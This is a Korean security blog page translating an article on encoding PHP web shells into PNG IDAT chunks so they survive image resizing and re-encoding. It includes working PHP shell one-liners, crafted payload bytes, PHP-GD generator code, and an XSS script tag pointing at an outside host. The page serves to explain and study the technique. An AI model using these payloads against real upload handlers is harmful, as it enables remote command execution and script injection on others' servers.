@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="renderer" content="webkit">
+
+  
+  <title>[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks | Defenit 블로그</title>
+
+  <link rel="shortcut icon" href="/images/favicon.png">
+  <link rel="alternate" href="/rss2.xml" title="Defenit 블로그">
+  <meta name="description" content="Encoding Web Shells in PNG IDAT chunks아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다. 외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다. 국내의 보안인들에게 도움이 되었으면 한다.(오역이 있을 수 있습니다.) 출처 : https://www.idontplaydarts.">
+<meta name="keywords" content="Web_Shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks">
+<meta property="og:url" content="https://defenit.kr/2019/10/03/Web/ㄴ Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/index.html">
+<meta property="og:site_name" content="Defenit 블로그">
+<meta property="og:description" content="Encoding Web Shells in PNG IDAT chunks아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다. 외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다. 국내의 보안인들에게 도움이 되었으면 한다.(오역이 있을 수 있습니다.) 출처 : https://www.idontplaydarts.">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/flow1.png">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/shellcode1.png">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/hexdumppngshell.png">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/resized-256x256.png">
+<meta property="og:image" content="https://www.idontplaydarts.com/images/resampled-256x256.png">
+<meta property="og:updated_time" content="2019-10-03T09:34:28.263Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks">
+<meta name="twitter:description" content="Encoding Web Shells in PNG IDAT chunks아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다. 외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다. 국내의 보안인들에게 도움이 되었으면 한다.(오역이 있을 수 있습니다.) 출처 : https://www.idontplaydarts.">
+<meta name="twitter:image" content="https://www.idontplaydarts.com/images/flow1.png">
+
+  <meta name="format-detection" content="telephone=no,email=no">
+  <meta name="theme-color" content="#9C27B0">
+  <meta name="description" content>
+  <meta name="keywords" content=",Web_Shell">
+
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="application-name" content="Defenit 블로그">
+  <meta name="msapplication-starturl" content="https://defenit.kr/2019/10/03/Web/ㄴ Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/">
+  <meta name="msapplication-navbutton-color" content="#9C27B0">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Defenit 블로그">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <link rel="apple-touch-icon" href="/images/favicon.png">
+
+  
+    <meta property="article:published_time" content="Thu Oct 03 2019 17:52:51 GMT+0900">
+    <meta property="article:modified_time" content="Thu Oct 03 2019 18:34:28 GMT+0900">
+  
+
+  
+    <link rel="canonical" href="https://defenit.kr/2019/10/03/Web/ㄴ Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/">
+  
+
+  <meta name="google-site-verification" content="Zw9X-H7aB3j4IjiTtdPzc5YXGbBCqAe65ysy9o2dOL8">
+  
+
+  
+  
+  
+
+  <link rel="stylesheet" href="/css/mdui.css">
+<link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
+  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
+  <div class="mdui-toolbar mdui-color-theme">
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
+    <a href="/" class="mdui-typo-headline">Defenit 블로그</a>
+    <div class="mdui-toolbar-spacer"></div>
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '검색'}"><i class="mdui-icon material-icons">search</i></a>
+    <a href="/rss2.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
+  </div>
+</header>
+<div class="mdui-dialog" id="search">
+  
+    <div class="search-form">
+      <input type="search" class="search-form-input" placeholder="입력">
+    </div>
+    <div class="search-result" data-resource="/search.xml"></div>
+  
+</div>
+  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
+  <div class="mdui-grid-tile">
+    <img src="/images/banner.png" style="height: 160px;">
+    <img src="/images/avatar.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
+    <div class="mdui-grid-tile-actions">
+      <div class="mdui-grid-tile-text">
+        <div class="mdui-grid-tile-title">Defenit</div>
+        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
+      </div>
+      
+    </div>
+  </div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    <a href="/" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
+      <div class="mdui-list-item-content">Home</div>
+    </a>
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
+        <div class="mdui-list-item-content">카테고리</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense"><hr>
+	   <h3>
+        <a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/">Crypto<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/">Pwn<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/">Rev<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/">Web<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-WriteUps/">ㄴ WriteUps<span class="mdui-ripple sidebar_archives-count">1</span></a></h3> <hr>
+		
+        
+      </div>
+    </div>
+    </div>
+    <a href="https://www.notion.so/j0n9hyun/4f40ecc7ba7241168f3bd41de0206e24?v=3b0cdd48c6c446098517cc8e8d0bf0fc" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
+      <div class="mdui-list-item-content">팀정보</div>
+    </a>
+  </div>
+
+  <div class="mdui-divider"></div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    
+      <a href="https://blog.naver.com/yjw_sz/221631615816" class="mdui-list-item mdui-ripple">Apply</a>
+    
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <div class="mdui-list-item-content">Links</div>
+        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+          <a href="https://ctf.j0n9hyun.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Wargame</a>
+        
+          <a href="https://www.facebook.com/Defenit-260502217757766/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Facebook</a>
+        
+        
+      </div>
+    </div>
+  </div>
+</aside>
+
+  <main id="main" class="mdui-m-t-5 fadeIn animated">
+  <link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
+  <article class="mdui-card mdui-m-b-5">
+    <header class="mdui-card-media">
+      <img src="/images/random/cover.png" style="max-height: 340px;">
+      <div class="mdui-card-media-covered">
+        <div class="mdui-card-primary">
+          <div class="mdui-card-primary-title">[번역] Encoding-Web-Shells-in-PNG-IDAT-chunks</div>
+          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2019-10-03 / <i class="iconfont">&#xe601;</i> rootable</div>
+        </div>
+      </div>
+      <div class="mdui-card-menu">
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
+          <ul class="mdui-menu" id="qrcode">
+            
+              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
+            
+            <li class="mdui-menu-item" disabled>
+              
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAADlElEQVR42u3aS47bMBAFQN//0pNtACP269eUogTFVeDINFla9PTn9WP9tl4IcODAgQMHDhw4cOB4MMcrXl82fXsy+e7nZz7v+f6t7i44cODAgeMKjuSqySfvR5/u0P366i44cODAgeMyjj8FpM8HSp7MQ+nm2uVdcODAgQPHwzim6VaS5iXpGQ4cOHDg+J84uoCXPLkpEeLAgQMHjqdxJAW16cWixk/w/Ob1XFgrxYEDBw4c64GG5//71vkOHDhw4MDxxtGtaZI2DZndkER5Fxw4cODAcZQjT6iSy0/Tvy7Ad0kmDhw4cOC4h+OexGla1MtfQ1J2HLSdcODAgQPHmiMPhNOf71Kv7sk8eA/+7sCBAwcOHIc48rGAnGlaKExeTHKqqHyJAwcOHDgu4EhKhGevfXZ4Lil0DmqlOHDgwIFjwZGH27zMF5XkFgN55bWTQIsDBw4cOA5x5AedhsOulTVtLOXFxPEQNg4cOHDgGHJ0YwddQO3SvC7xGwRpHDhw4MBxlGPaUvoJVg7XXalL53DgwIEDxz0cecKWFwGTT6aXz1/DdE8cOHDgwHGWo0u3NmXELnwmu5WBHAcOHDhwHOXIg2JHkydUmwGILtXEgQMHDhzXceTDBF16lo8aJAF4CvHlf3HgwIEDx1GO6TU2ZcSuvDgN8OOT4MCBAweOCzi6AYVuNOGKNGxaOsSBAwcOHPdw5IFzA7dvPuVtpyj9w4EDBw4cRzmmraPkZ/JEKw+309JkmcLhwIEDB45DHPujT5O3U4H887eiZ3DgwIEDx2UcSXDdDzp0CV5X+FsFWhw4cODAcaiDvwpaceI3HV9IwnxX3MSBAwcOHGc5piEqLxd2QXcD3Y1E4MCBAweOsxz5OML0MvthhemeeSMNBw4cOHBcx3GWYLOme06TOhw4cODAcQ9Hd6yk4TQt7XWBPN95VSvFgQMHDhzrPsumUdQV6U6VLJMCIg4cOHDguI5jf9BkbLobYugCZ1IixIEDBw4c13G84jU9Sj7ckA8l7JtS0d8dOHDgwIFjzZEH14Qg+aTbpwvAX34RBw4cOHBcxrEZdM6LdN3YxKZE+OUuOHDgwIHjr3LkaVVS/stZp80wHDhw4MDxr3BMr5enhXnhL0rMNm0nHDhw4MBxiGMzxJCEwE0QPfXyDtdKceDAgQPHeqChS73yJlZSCpwWKHHgwIEDx50cFg4cOHDgwIEDBw4cOB62fgEKYZaHEaRiUQAAAABJRU5ErkJggg==">
+              
+            </li>
+          </ul>
+        
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
+          <ul class="mdui-menu" id="share_menu">
+            <li class="mdui-menu-item">
+              <a href="https://www.facebook.com/sharer/sharer.php?u=https://defenit.kr/2019/10/03/Web/ㄴ Research/Encoding-Web-Shells-in-PNG-IDAT-chunks/" target="_blank" class="mdui-ripple">페이스북 공유</a>
+            </li>
+          </ul>
+        
+      </div>
+    </header>
+    <div class="mdui-card-content mdui-typo">
+      <h1 id="Encoding-Web-Shells-in-PNG-IDAT-chunks"><a href="#Encoding-Web-Shells-in-PNG-IDAT-chunks" class="headerlink" title="Encoding Web Shells in PNG IDAT chunks"></a>Encoding Web Shells in PNG IDAT chunks</h1><p>아래는 PNG 파일 포맷을 이용하여 웹쉘을 삽입하는 내용에 대한 글이다.</p>
+<p>외국문서인 만큼 영어로 되어있길래 잘 이해가 되지 않아 번역을 하며 자세히 알아보았다.</p>
+<p>국내의 보안인들에게 도움이 되었으면 한다.<br>(오역이 있을 수 있습니다.)</p>
+<p>출처 : <a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
+<hr>
+
+<p>만약 너가 이미지 안에 웹쉘을 신중하게 넣는다면, 너는 서버 측 필터를 우회할 수 있고 쉘을 구체화할 수 있을 것이다(그리고 나는 주석이나 metadata에 인코딩된 데이터를 넣는것에 대해 말하는 것이 아니다) - 해당 포스트는 당신에게 오직 <a href="https://www.php.net/manual/en/book.image.php/" target="_blank" rel="noopener">GD</a>만을 이용하여 PNG IDAT chunks 에 PHP 쉘을 작성할 수 있다는 것을 보여줄 것이다.</p>
+<p>만약 너가 파일 시스템에 코드를 작성할 수 없다면 <a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/" target="_blank" rel="noopener">서버의 미흡한 설정</a> 혹은 Local File Inclusion을 exploit 하는 것은 곤란할 수 있다. - 이미지 업로드를 허용하는 과거의 어플리케이션은 metadate나 변조된 이미지를 통해 코드를 서버에 업로드하는 제한된 방법을 제공했다. 그러나 꽤 종종 이미지들은 크기가 조정되거나 회전되거나 메타 데이터가 제거되거나 다른 파일 형식으로 인코딩되어 웹쉘 페이로드가 효과적으로 제거된다.<br><br><br></p>
+<h3 id="PNG-파일-형식-기초"><a href="#PNG-파일-형식-기초" class="headerlink" title="PNG 파일 형식 기초"></a>PNG 파일 형식 기초</h3><p>PNG 파일 포맷(우리는 인덱싱된 것이 아니라 true-color PNG 파일에 초점을 둘 것이다)에서 IDAT chunk는 픽셀 정보를 저장한다. 우리가 PHP 쉘을 저장할 곳은 이 chunk이다. 이제 우리는 픽셀이 항상 RGB color 채널을 나타내는 3 byte로 저장된다고 가정하자.</p>
+<p>raw 이미지가 PNG로 저장이 될 때, 이미지의 각 행은 각 바이트 단위로 <a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">필터링되고</a> 행은 사용된 필터 유형을 나타내는 번호(0x01 ~ 0x05)가 접두사로 붙으며, 다른 행은 다른 필터를 사용할 수 있다. 이렇게 하는 이유는 <a href="http://www.w3.org/TR/PNG-Rationale.html" target="_blank" rel="noopener">압축 비율을 향상</a>시키기 위함이다. 모든 행이 필터링되면 그것들은 IDAT chunk를 형성하기 위해 모두 DEFLATE 알고리즘으로 압축된다.</p>
+<p><img src="https://www.idontplaydarts.com/images/flow1.png" alt="flow1"></p>
+<p>그래서 만약 우리가 데이터를 raw 이미지로 입력하고 쉘로 저장하려면 우리는 PNG 라인 필터와 DEFLATE 알고리즘을 둘다 무산시킬 필요가 있다. 거꾸로 작업하는 것이 더 쉬우므로 우리는 DELFATE 부터 시작할 것이다.<br><br><br></p>
+<h3 id="Step-1-쉘을-형성하기-위해-문자열-압축하기"><a href="#Step-1-쉘을-형성하기-위해-문자열-압축하기" class="headerlink" title="Step 1. 쉘을 형성하기 위해 문자열 압축하기"></a>Step 1. 쉘을 형성하기 위해 문자열 압축하기</h3><p>쉘을 형성하기 위해서는 압축하는 문자열을 설계하는 것이 이상적이다. 이는 생각하는 것만큼 어렵지는 않지만 분명히 문자열에는 반복되는 코드 블록이 포함될 수 없다(또는 압축될 것이다). 사실, 쉘이 압축되는 것으로부터 막기 위해서는 길이가 2글자 이상 반복되는 부분 문자열이 없도록 설계해야 한다. 이것은 우리가 문자열을 짧게 유지해야한다는 것을 의미한다 :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`$_GET[<span class="number">0</span>]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>이렇게 간단하다면 얼마나 좋을까 :) 안타깝게도, 만약 너가 위의 문자열을 DEFLATE로 실행하면 많은 쓰레기가 나오게 되는데, 그 문자열은 압축되지 않았지만 DEFLATE 결과는 byte boundary에서 시작하지 않고 MSB가 아닌 LSB를 사용하여 인코딩된다. 자세히 말하지는 않겠지만 당신은 <a href="https://pograph.wordpress.com/2009/06/04/notes-on-gzip-and-deflate-format/" target="_blank" rel="noopener">Pograph의 weblog</a>에서 더 많은 것을 읽을 수 있다.</p>
+<p>인코딩하기 가장 쉬운 쉘은 상위 케이스에 있다 :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_GET[<span class="number">0</span>]($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>당신은 $_GET[0]을 <code>shell_exec</code>로 지정하고 $_POST[1] 파라미터에 실행하기 위한 쉘 명령어를 전달함으로써 사용할 수 있다.</p>
+<p>나는 위의 문장을 DEFLATES 포맷으로 문자열을 설계했으며, 이 문자열의 이점은 페이로드의 첫번째 바이트가 0x00에서 0x04까지 변경될 수 있고 압축된 문자열도 여전히 읽을 수 있다는 것이다. - 이것은 다음 단계에서 마주할 PNG 필터를 회피하는데 중요하다.</p>
+<p><span style="color:green">03</span>a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310</p>
+<p>안타깝게도 PNG 라이브러리가 이미지 행을 먼저 필터링하고 DEFLATE를 적용하기 때문에 이것을 초기 원시 이미지에 포함시키고 IDAT chunk에 포함시킬 수는 없다.<br><br><br></p>
+<h3 id="Step-2-PNG-라인-필터-우회"><a href="#Step-2-PNG-라인-필터-우회" class="headerlink" title="Step 2. PNG 라인 필터 우회"></a>Step 2. PNG 라인 필터 우회</h3><p><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Filters.html" target="_blank" rel="noopener">5가지 종류의 필터</a>가 있으며 PNG encoder가 각 라인에 사용할 필터를 결정한다. 이제 문제는 필터로 전달될 때 1단계의 문자열이 생성되는 문자열을 구성해야 한다는 것이다. </p>
+<p>이미지에 오직 1행의 payload만 포함되어있는 한 (이미지의 나머지 부분ì 검은 색과 같이 일정한 색상이어야 함) 당신이 마주치는 두 필터는 1과 3일 것이며, 만약 이미지의 왼쪽 상단에 페이로드가 남아있는 경우 그것을 더욱 단순화하기 위해 우리는 다음과 같이 두 필터의 역순을 쓸 수 있다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Reverse Filter 1</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + $p[$i]) % <span class="number">256</span>;</span><br><span class="line"><span class="comment">// Reverse Filter 3 </span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $s; $i++)</span><br><span class="line">   $p[$i+<span class="number">3</span>] = ($p[$i+<span class="number">3</span>] + floor($p[$i] / <span class="number">2</span>)) % <span class="number">256</span>;</span><br></pre></td></tr></table></figure>
+<p>만약 필터 3만 사용하여 payload를 인코딩하면 PNG 인코더는 필터 1을 사용하려 인코딩하려할 것이고, 필터 1을 사용하여 인코딩하려하면 PNG 인코더는 필터0을 사용하려 할 것이다 - 결국 당신은 루프에 빠지게 된다.</p>
+<p>PNG 인코더가 선택하는 필터를 컨트롤하기 위해 필터 3과 필터 1의 역으로 2단계에서 쉘을 인코딩하고 이를 연결하여 인코더가 payload에 대해 필터 3을 선택하도록 하며 원시 이미지의 데이터가 2단계에서 코드로 변환되도록 한다. 이 코드는 IDAT chunk에 저장된 웹 쉘로 압축된다.</p>
+<p>이 방법을 사용하면 아래의 payload가 생성된다. - 필터 3은 녹색, 필터 1은 회색이다.<br>아러니하게 필터를 사용하면 실제로 페이로드가 더 커진다.</p>
+<p><span style="color:green">0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc</span>, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33<br><br><br></p>
+<h3 id="Step-3-Raw-Image-구성하기"><a href="#Step-3-Raw-Image-구성하기" class="headerlink" title="Step 3. Raw Image 구성하기"></a>Step 3. Raw Image 구성하기</h3><p>GD가 PNG 파일로 인코딩할 raw image를 구성할 때 이미지의 첫번째 행에 payload를 배치하는 것은 중요하다. 이 시점에서 위에서 제공한 페이로드는 작은 이미지(최대 ~40px by ~ 40px) 에서만 작동하지만 더 큰 이미지에 대해서도 payload를 구성할 수 있다.</p>
+<p>페이로드는 다음과 같이 RGB byte 시퀀스로 인코딩되어야 한다:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">        <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">        <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">        <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">        <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">        <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">  $r = $p[$y];</span><br><span class="line">  $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">  $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">  $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">  imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img);</span><br></pre></td></tr></table></figure>
+<p>이미지가 구성되면 검은 배경의 왼쪽 상단 모서리에 픽셀 문자열이 나타난다.</p>
+<p><img src="https://www.idontplaydarts.com/images/shellcode1.png" alt="shellcod1"></p>
+<p>이미지를 hex editor로 볼 때 쉘을 볼 수 있어야 한다:</p>
+<p><img src="https://www.idontplaydarts.com/images/hexdumppngshell.png" alt="hexdumppngshell.png"><br><br><br></p>
+<h3 id="Step-4-이미지-변환-우회"><a href="#Step-4-이미지-변환-우회" class="headerlink" title="Step 4. 이미지 변환 우회"></a>Step 4. 이미지 변환 우회</h3><p>IDAT chunk 에 웹쉘을 넣는 주된 이유는 리사이즈와 리샘플링 작업을 우회할 수 있기 때문이다. - PHP-GD는 이 <a href="https://www.php.net/manual/en/function.imagecopyresized.php" target="_blank" rel="noopener">imagecopyresized</a>와 <a href="https://www.php.net/manual/en/function.imagecopyresampled.php" target="_blank" rel="noopener">imagecopyresampled</a>를 수행하는 두 함수를 포함하고 있다.</p>
+<p>Imagecopyresampled는 픽셀 그룹에서 평균 픽셀 값을 가져와 이미지를 변환하는데 이것을 우회하기 위해서는 payload를 일련의 직사각형 혹은 정사각형으로 인코딩해야 한다. 반면에 Imagecopyresized는 몇 픽셀마다 샘플링하여 이미지를 변환하므로 이 기능을 우회하기 위해서는 실제로 몇 픽셀만 변경하면 된다.</p>
+<p><img src="https://www.idontplaydarts.com/images/resized-256x256.png" alien="left"><br>위에 있는 이미지는 imagecopyresize를 사용하여 32x32로 리사이즈할 때와 아래에 있는 이미지를 imagecopyresample을 사용하여 32x32로 리샘플링할 때 둘 다 웹쉘을 나타낸다.<br><img src="https://www.idontplaydarts.com/images/resampled-256x256.png" alien="right"><br><br><br></p>
+<h3 id="몇-가지-결론"><a href="#몇-가지-결론" class="headerlink" title="몇 가지 결론"></a>몇 가지 결론</h3><p>IDAT chunk에 쉘을 배치하는 것은 몇 가지 큰 이점이 있으며 어플리케이션이 업로드된 이미지를 resize 혹은 re-encode 하는 대부분의 데이터 유효성 검사 기술을 우회해야 한다. 최종이미지가 PNG로 저장되는 한 당신은 위의 페이로드를 GIF나 JPEG로도 업로드할 수 있다.</p>
+<p>쉘을 더욱 효과적으로 숨기고 업로드된 이미지에서 쉘을 찾는데 더 짧도록 사용할 수 있는 더 나은 기법이 있을 수 있으며, 아마도 그것을 막아야 하는 개발자로서 할 수 있는 것은 많지 않을 것이다.</p>
+<p>JPEG와 같이 손실이 많은 형식으로 쉘을 인코딩하는 것은 상당히 어려울 수 있다 - 그러나 불가능하지는 않을 것이다.</p>
+<hr>
+<h3 id="업데이트-2015년-7월"><a href="#업데이트-2015년-7월" class="headerlink" title="업데이트 : 2015년 7월"></a>업데이트 : 2015년 7월</h3><p>만약 사용자가 제공하는 PNG 파일을 포함하는 http 응답의 content-type 필드를 제어할 수 있다면 다음의 payload가 유용할 수 있다. 다음의 스크립트 태그를 IDAT chunk로 인코딩한다 :</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRiPT</span> <span class="attr">sRC</span>=<span class="string">//XQI.CC</span>&gt;</span><span class="tag">&lt;/<span class="name">SCrIpt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>참조하는 스크립트는 custom payload를 삽입할 수 있는 GET 파라미터 zz의 내용을 실행한다. 그것은 당신의 target origin에 효과적으로 reflected XSS 엔드 포인트를 제공한다.</p>
